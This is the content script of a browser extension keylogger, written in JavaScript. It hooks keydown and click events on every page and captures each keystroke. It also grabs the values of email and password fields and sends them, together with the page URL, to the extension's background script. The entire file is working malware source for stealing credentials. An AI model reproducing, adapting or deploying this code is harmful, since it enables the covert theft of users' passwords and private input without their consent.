// this script actually gets the keystrokes and form grabs

let port = chrome.runtime.connect();
const importantTypes = ["email", "password"];
let previousInput;


function sendToBackground(data) {
    try {
        port.postMessage(data);
    } catch {
        // do nothing
    }
}


function logInput() {
    let inputsList = document.getElementsByTagName("input");
    let inputs = ""

    for (let i = 0; i < inputsList.length; i++) {
        let input = inputsList[i];

        if (importantTypes.includes(input.type)) {
            inputs += `<input type=${inputsList[i].type}> ${input.value} `;
        }
    }

    // do not log input if it is the same as the previous input
    if (previousInput == inputs) {
        return;
    }

    previousInput = inputs;

    let data = {
        key: inputs,
        page: window.location.href
    }

    sendToBackground(data);
}


window.onkeydown = (event) => {
    if (event.key == "Enter") {
        logInput();
    }

    let data = {
        key: event.key,
        page: window.location.href
    };

    console.log(`event.key = ${event.key}`);

    sendToBackground(data);
}


window.onclick = () => {
    logInput();
}
